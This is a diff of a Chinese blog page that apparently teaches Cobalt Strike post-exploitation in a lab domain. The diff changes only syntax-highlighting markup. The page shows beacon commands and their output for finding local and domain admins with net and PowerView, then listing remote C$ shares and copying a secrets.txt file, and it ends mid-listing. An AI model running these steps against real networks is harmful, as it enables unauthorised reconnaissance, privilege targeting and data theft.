@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -471,236 +474,270 @@
 <h1 id="0x01-管理员账号"><a href="#0x01-管理员账号" class="headerlink" title="0x01 管理员账号"></a>0x01 管理员账号</h1><p>第一个关键步骤，发现管理员账号。</p>
 <p>如果想知道自己是否为管理员账号，可以尝试运行一些只有管理员账号才有权限操作的命令，然后通过返回结果判断是否为管理员。</p>
 <p>其中一种方式是尝试列出仅仅只有管理员才能查看的共享列表，比如下面的 <code>dir \\host\C$</code> 命令，如果可以看到一个文件列表，那么说明可能拥有本地管理员权限。</p>
-<pre><code class="powershell">shell dir \\host\C$</code></pre>
-<pre><code class="powershell">#管理员账号运行结果
-beacon&gt; shell dir \\WIN-P26AK33U871\C$
-[*] Tasked beacon to run: dir \\WIN-P26AK33U871\C$
-[+] host called home, sent: 55 bytes
-[+] received output:
- 驱动器 \\WIN-P26AK33U871\C$ 中的卷没有标签。
- 卷的序列号是 F269-89A7
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">dir</span> \\host\C$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
- \\WIN-P26AK33U871\C$ 的目录
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#管理员账号运行结果</span>
+beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P26AK33U871\C$
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P26AK33U871\C$
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+ 驱动器 \\WIN<span class="token operator">-</span>P26AK33U871\C$ 中的卷没有标签。
+ 卷的序列号是 F269<span class="token operator">-</span>89A7
 
-2020/06/24  09:29    &lt;DIR&gt;          inetpub
-2009/07/14  11:20    &lt;DIR&gt;          PerfLogs
-2020/07/16  21:24    &lt;DIR&gt;          Program Files
-2020/07/16  21:52    &lt;DIR&gt;          Program Files (x86)
-2020/07/17  23:00    &lt;DIR&gt;          Users
-2020/07/26  00:55    &lt;DIR&gt;          Windows
+ \\WIN<span class="token operator">-</span>P26AK33U871\C$ 的目录
+
+2020<span class="token operator">/</span>06<span class="token operator">/</span>24  09:29    &lt;<span class="token function">DIR</span>>          inetpub
+2009<span class="token operator">/</span>07<span class="token operator">/</span>14  11:20    &lt;<span class="token function">DIR</span>>          PerfLogs
+2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:24    &lt;<span class="token function">DIR</span>>          Program Files
+2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:52    &lt;<span class="token function">DIR</span>>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>
+2020<span class="token operator">/</span>07<span class="token operator">/</span>17  23:00    &lt;<span class="token function">DIR</span>>          Users
+2020<span class="token operator">/</span>07<span class="token operator">/</span>26  00:55    &lt;<span class="token function">DIR</span>>          Windows
                0 个文件              0 字节
-               6 个目录 28,500,807,680 可用字节</code></pre>
-<pre><code class="powershell">#一般账号运行结果
-beacon&gt; shell dir \\WIN-72A8ERDSF2P\C$
-[*] Tasked beacon to run: dir \\WIN-72A8ERDSF2P\C$
-[+] host called home, sent: 55 bytes
-[+] received output:
-拒绝访问。</code></pre>
-<p>也可以运行其他命令，比如运行下面的 <code>at</code> 命令来查看系统上的计划任务列表，如果显示出了任务列表信息，那么可能是本地管理员。（当任务列表没有信息时会返回 “列表是空的” 提示）</p>
-<pre><code class="powershell">shell at \\host</code></pre>
-<pre><code class="powershell">#管理员账号运行结果
-beacon&gt; shell at \\WIN-P2AASSD1AF1
-[*] Tasked beacon to run: at \\WIN-P2AASSD1AF1
-[+] host called home, sent: 51 bytes
-[+] received output:
-状态 ID     日期                    时间          命令行
--------------------------------------------------------------------------------
-        1   今天                    22:30         E:\Install\Thunder\Thunder.exe</code></pre>
-<pre><code class="powershell">#一般账号运行结果
-beacon&gt; shell at \\WIN-72A8ERDSF2P
-[*] Tasked beacon to run: at \\WIN-72A8ERDSF2P
-[+] host called home, sent: 51 bytes
-[+] received output:
-拒绝访问。</code></pre>
-<p>在上一节讲述的 <code>PowerView</code> 有很多很好的自动操作来帮助解决这些问题。可以在加载 <code>PowerView</code> 后，运行下面的命令，通过 <code>PowerView</code> 可以快速找到管理员账号。</p>
-<pre><code class="powershell">powershell Find-LocalAdminAccess</code></pre>
-<pre><code class="powershell">beacon&gt; powershell-import powerview.ps1
-[*] Tasked beacon to import: powerview.ps1
-[+] host called home, sent: 101224 bytes
+               6 个目录 28<span class="token punctuation">,</span>500<span class="token punctuation">,</span>807<span class="token punctuation">,</span>680 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-beacon&gt; powershell Find-LocalAdminAccess
-[*] Tasked beacon to run: Find-LocalAdminAccess
-[+] host called home, sent: 329 bytes
-[+] received output:
-WIN-P26AK33U871.teamssix.com</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#一般账号运行结果</span>
+beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>72A8ERDSF2P\C$
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>72A8ERDSF2P\C$
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+拒绝访问。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>也可以运行其他命令，比如运行下面的 <code>at</code> 命令来查看系统上的计划任务列表，如果显示出了任务列表信息，那么可能是本地管理员。（当任务列表没有信息时会返回 “列表是空的” 提示）</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell at \\host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#管理员账号运行结果</span>
+beacon> shell at \\WIN<span class="token operator">-</span>P2AASSD1AF1
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: at \\WIN<span class="token operator">-</span>P2AASSD1AF1
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 51 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+状态 ID     日期                    时间          命令行
+<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>
+        1   今天                    22:30         E:\Install\Thunder\Thunder<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#一般账号运行结果</span>
+beacon> shell at \\WIN<span class="token operator">-</span>72A8ERDSF2P
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: at \\WIN<span class="token operator">-</span>72A8ERDSF2P
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 51 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+拒绝访问。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在上一节讲述的 <code>PowerView</code> 有很多很好的自动操作来帮助解决这些问题。可以在加载 <code>PowerView</code> 后，运行下面的命令，通过 <code>PowerView</code> 可以快速找到管理员账号。</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">powershell <span class="token function">Find-LocalAdminAccess</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell<span class="token operator">-</span>import powerview<span class="token punctuation">.</span>ps1
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to import: powerview<span class="token punctuation">.</span>ps1
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 101224 bytes
+
+beacon> powershell <span class="token function">Find-LocalAdminAccess</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Find-LocalAdminAccess</span>
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 329 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+WIN<span class="token operator">-</span>P26AK33U871<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h1 id="0x02-域管理员账号"><a href="#0x02-域管理员账号" class="headerlink" title="0x02 域管理员账号"></a>0x02 域管理员账号</h1><p>第二个关键步骤，发现域管理员账号。</p>
 <h2 id="列出域管理员"><a href="#列出域管理员" class="headerlink" title="列出域管理员"></a>列出域管理员</h2><p>对于发现域管理员账号，可以在共享里使用本地的Windows命令。运行以下两条命令可以用来找出这些“域群组”的成员。</p>
-<pre><code class="powershell">net group &quot;enterprise admins&quot; /DOMAIN
-net group &quot;domain admins&quot; /DOMAIN</code></pre>
-<pre><code class="powershell">beacon&gt; shell net group &quot;enterprise admins&quot; /domain
-[*] Tasked beacon to run: net group &quot;enterprise admins&quot; /domain
-[+] host called home, sent: 68 bytes
-[+] received output:
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net <span class="token function">group</span> <span class="token string">"enterprise admins"</span> <span class="token operator">/</span>DOMAIN
+net <span class="token function">group</span> <span class="token string">"domain admins"</span> <span class="token operator">/</span>DOMAIN<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell net <span class="token function">group</span> <span class="token string">"enterprise admins"</span> <span class="token operator">/</span>domain
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: net <span class="token function">group</span> <span class="token string">"enterprise admins"</span> <span class="token operator">/</span>domain
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 68 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
 组名     Enterprise Admins
 注释     企业的指定系统管理员
 成员
--------------------------------------------------------------------------------
+<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>
 Administrator            
-命令成功完成。</code></pre>
-<pre><code class="powershell">beacon&gt; shell net group &quot;domain admins&quot; /domain
-[*] Tasked beacon to run: net group &quot;domain admins&quot; /domain
-[+] host called home, sent: 64 bytes
-[+] received output:
+命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell net <span class="token function">group</span> <span class="token string">"domain admins"</span> <span class="token operator">/</span>domain
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: net <span class="token function">group</span> <span class="token string">"domain admins"</span> <span class="token operator">/</span>domain
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 64 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
 组名     Domain Admins
 注释     指定的域管理员
 成员
--------------------------------------------------------------------------------
+<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>
 Administrator            
-命令成功完成。</code></pre>
+命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>或者运行下面的命令来看谁是域控制器上的管理员</p>
-<pre><code class="powershell">net localgroup &quot;administrators&quot; /DOMAIN</code></pre>
-<pre><code class="powershell">beacon&gt; shell net localgroup &quot;administrators&quot; /domain
-[*] Tasked beacon to run: net localgroup &quot;administrators&quot; /domain
-[+] host called home, sent: 70 bytes
-[+] received output:
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net localgroup <span class="token string">"administrators"</span> <span class="token operator">/</span>DOMAIN<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell net localgroup <span class="token string">"administrators"</span> <span class="token operator">/</span>domain
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: net localgroup <span class="token string">"administrators"</span> <span class="token operator">/</span>domain
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 70 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
 别名     administrators
-注释     管理员对计算机/域有不受限制的完全访问权
+注释     管理员对计算机<span class="token operator">/</span>域有不受限制的完全访问权
 成员
--------------------------------------------------------------------------------
+<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>
 administrator
 Domain Admins
 Daniel
 Enterprise Admins
-命令成功完成。</code></pre>
+命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="net-模块"><a href="#net-模块" class="headerlink" title="net 模块"></a>net 模块</h2><p>beacon 的 net 模块也可以帮助我们，下面的命令中 <code>TARGET</code> 的意思是一个域控制器或者是任何想查看的组名，比如企业管理员、域管理员等等</p>
-<pre><code class="powershell">net group \\TARGET group name</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net <span class="token function">group</span> \\TARGET <span class="token function">group</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>也可以运行下面的命令，这会连接任意目标来获取列表</p>
-<pre><code class="powershell">net localgroup \\TARGET group name</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net localgroup \\TARGET <span class="token function">group</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h1 id="0x03-本地管理员"><a href="#0x03-本地管理员" class="headerlink" title="0x03 本地管理员"></a>0x03 本地管理员</h1><h2 id="net-模块-1"><a href="#net-模块-1" class="headerlink" title="net 模块"></a>net 模块</h2><p>本地管理员可能是一个域账户，因此如果想把一个系统作为目标，应该找到谁是这个系统的本地管理员，因为如果获得了它的密码哈希值或者凭据就可以伪装成那个用户。</p>
 <p>beacon 的 net 模块可以在系统上从一个没有特权的关联中查询本地组和用户。</p>
 <p>在 beacon 控制台中运行下面命令可以获得一个目标上的群组列表</p>
-<pre><code class="powershell">net localgroup \\TARGET</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net localgroup \\TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>如果想获取群组的列表，可运行下面的命令来获得一个群组成员的名单列表。</p>
-<pre><code class="powershell">net localgroup \\TARGET group name</code></pre>
-<pre><code class="powershell">beacon&gt; net localgroup \\WIN-P26AK33U871 administrators
-[*] Tasked beacon to run net localgroup administrators on WIN-P26AK33U871
-[+] host called home, sent: 104510 bytes
-[+] received output:
-Members of administrators on \\WIN-P26AK33U871:
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net localgroup \\TARGET <span class="token function">group</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> net localgroup \\WIN<span class="token operator">-</span>P26AK33U871 administrators
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run net localgroup administrators on WIN<span class="token operator">-</span>P26AK33U871
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 104510 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+Members of administrators on \\WIN<span class="token operator">-</span>P26AK33U871:
 TEAMSSIX\Administrator
 TEAMSSIX\Daniel
 TEAMSSIX\Enterprise Admins
-TEAMSSIX\Domain Admins</code></pre>
-<h2 id="PowerView-模块"><a href="#PowerView-模块" class="headerlink" title="PowerView 模块"></a>PowerView 模块</h2><p>PowerView 使用下面的命令能够在一个主机上找到本地管理员，这条命令实际上通过管理员群组找到同样的群组并且把成员名单返回出来。</p>
-<pre><code class="powershell">Get-Netlocalgroup -hostname TARGET</code></pre>
-<pre><code class="powershell">beacon&gt; powershell Get-Netlocalgroup -Hostname WIN-P26AK33U871
-[*] Tasked beacon to run: Get-Netlocalgroup -Hostname WIN-P26AK33U871
-[+] host called home, sent: 385 bytes
-[+] received output:
+TEAMSSIX\Domain Admins<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-ComputerName : WIN-P26AK33U871
-AccountName  : teamssix.com/Administrator
+<h2 id="PowerView-模块"><a href="#PowerView-模块" class="headerlink" title="PowerView 模块"></a>PowerView 模块</h2><p>PowerView 使用下面的命令能够在一个主机上找到本地管理员，这条命令实际上通过管理员群组找到同样的群组并且把成员名单返回出来。</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-Netlocalgroup</span> <span class="token operator">-</span>hostname TARGET<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> powershell <span class="token function">Get-Netlocalgroup</span> <span class="token operator">-</span>Hostname WIN<span class="token operator">-</span>P26AK33U871
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">Get-Netlocalgroup</span> <span class="token operator">-</span>Hostname WIN<span class="token operator">-</span>P26AK33U871
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 385 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+
+ComputerName : WIN<span class="token operator">-</span>P26AK33U871
+AccountName  : teamssix<span class="token punctuation">.</span>com<span class="token operator">/</span>Administrator
 IsDomain     : True
 IsGroup      : False
-SID          : S-1-5-22-3301978333-983314215-684642015-500
+SID          : S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>22<span class="token operator">-</span>3301978333<span class="token operator">-</span>983314215<span class="token operator">-</span>684642015<span class="token operator">-</span>500
 Description  : 
 Disabled     : 
-LastLogin    : 2020/8/17 22:21:23
+LastLogin    : 2020<span class="token operator">/</span>8<span class="token operator">/</span>17 22:21:23
 PwdLastSet   : 
 PwdExpired   : 
 UserFlags    : 
 
-ComputerName : WIN-P26AK33U871
-AccountName  : teamssix.com/Daniel
-……内容过多，余下部分省略……</code></pre>
+ComputerName : WIN<span class="token operator">-</span>P26AK33U871
+AccountName  : teamssix<span class="token punctuation">.</span>com<span class="token operator">/</span>Daniel
+……内容过多，余下部分省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h1 id="0x04-无需恶意软件"><a href="#0x04-无需恶意软件" class="headerlink" title="0x04 无需恶意软件"></a>0x04 无需恶意软件</h1><p>如果一个系统信任我们为本地管理员权限，那么我们可以在那个系统上干什么呢？</p>
 <h2 id="1、查看共享文件"><a href="#1、查看共享文件" class="headerlink" title="1、查看共享文件"></a>1、查看共享文件</h2><p>比如我们可以通过运行下面的命令来列出 C:\foo 的共享文件</p>
-<pre><code class="powershell">shell dir \\host\C$\foo</code></pre>
-<pre><code class="powershell">beacon&gt; shell dir \\WIN-P2AASSD1AF1\C$
-[*] Tasked beacon to run: dir \\WIN-P2AASSD1AF1\C$
-[+] host called home, sent: 55 bytes
-[+] received output:
- 驱动器 \\WIN-P2AASSD1AF1\C$ 中的卷没有标签。
- 卷的序列号是 F269-89A7
- \\WIN-P2AASSD1AF1\C$ 的目录
-2020/06/24  09:29    &lt;DIR&gt;          inetpub
-2009/07/14  11:20    &lt;DIR&gt;          PerfLogs
-2020/07/16  21:24    &lt;DIR&gt;          Program Files
-2020/07/16  21:52    &lt;DIR&gt;          Program Files (x86)
-2020/07/17  23:00    &lt;DIR&gt;          Users
-2020/07/26  00:55    &lt;DIR&gt;          Windows
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">dir</span> \\host\C$\foo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 55 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+ 驱动器 \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 中的卷没有标签。
+ 卷的序列号是 F269<span class="token operator">-</span>89A7
+ \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$ 的目录
+2020<span class="token operator">/</span>06<span class="token operator">/</span>24  09:29    &lt;<span class="token function">DIR</span>>          inetpub
+2009<span class="token operator">/</span>07<span class="token operator">/</span>14  11:20    &lt;<span class="token function">DIR</span>>          PerfLogs
+2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:24    &lt;<span class="token function">DIR</span>>          Program Files
+2020<span class="token operator">/</span>07<span class="token operator">/</span>16  21:52    &lt;<span class="token function">DIR</span>>          Program Files <span class="token punctuation">(</span>x86<span class="token punctuation">)</span>
+2020<span class="token operator">/</span>07<span class="token operator">/</span>17  23:00    &lt;<span class="token function">DIR</span>>          Users
+2020<span class="token operator">/</span>07<span class="token operator">/</span>26  00:55    &lt;<span class="token function">DIR</span>>          Windows
                0 个文件              0 字节
-               6 个目录 28,500,393,984 可用字节</code></pre>
+               6 个目录 28<span class="token punctuation">,</span>500<span class="token punctuation">,</span>393<span class="token punctuation">,</span>984 可用字节<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="2、复制文件"><a href="#2、复制文件" class="headerlink" title="2、复制文件"></a>2、复制文件</h2><p>比如运行下面的命令将 <code>secrets.txt</code>文件复制到当前目录。</p>
-<pre><code class="powershell">shell copy \\host\C$\foo\secrets.txt</code></pre>
-<pre><code class="powershell">beacon&gt; shell copy \\WIN-P2AASSD1AF1\C$\foo\secrets.txt
-[*] Tasked beacon to run: copy \\WIN-P2AASSD1AF1\C$\foo\secrets.txt
-[+] host called home, sent: 93 bytes
-[+] received output:
-已复制         1 个文件。</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">copy</span> \\host\C$\foo\secrets<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">copy</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\foo\secrets<span class="token punctuation">.</span>txt
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">copy</span> \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\foo\secrets<span class="token punctuation">.</span>txt
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 93 bytes
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:
+已复制         1 个文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h2 id="3、查看文件列表"><a href="#3、查看文件列表" class="headerlink" title="3、查看文件列表"></a>3、查看文件列表</h2><p>比如运行下面的命令。其中 /S 表示列出指定目录及子目录所有文件，/B 表示使用空格式，即没有标题或摘要信息。</p>
-<pre><code class="powershell">shell dir /S /B \\host\C$</code></pre>
-<pre><code class="powershell">beacon&gt; shell dir /S /B \\WIN-P2AASSD1AF1\C$\Users
-[*] Tasked beacon to run: dir /S /B \\WIN-P2AASSD1AF1\C$\Users
-[+] host called home, sent: 67 bytes
-[+] received output:
-\\WIN-P2AASSD1AF1\C$\Users\administrator
-\\WIN-P2AASSD1AF1\C$\Users\Classic .NET AppPool
-\\WIN-P2AASSD1AF1\C$\Users\Daniel
-\\WIN-P2AASSD1AF1\C$\Users\Public
-\\WIN-P2AASSD1AF1\C$\Users\administrator\Contacts
-\\WIN-P2AASSD1AF1\C$\Users\administrator\Desktop
-\\WIN-P2AASSD1AF1\C$\Users\administrator\Documents
-\\WIN-P2AASSD1AF1\C$\Users\administrator\Downloads
-\\WIN-P2AASSD1AF1\C$\Users\administrator\Favorites
-……内容过多，余下部分省略……</code></pre>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">dir</span> <span class="token operator">/</span>S <span class="token operator">/</span>B \\host\C$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">dir</span> <span class="token operator">/</span>S <span class="token operator">/</span>B \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">dir</span> <span class="token operator">/</span>S <span class="token operator">/</span>B \\WIN<span class="token operator">-</span>P2AASSD1AF1\C$\Users
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 67 bytes
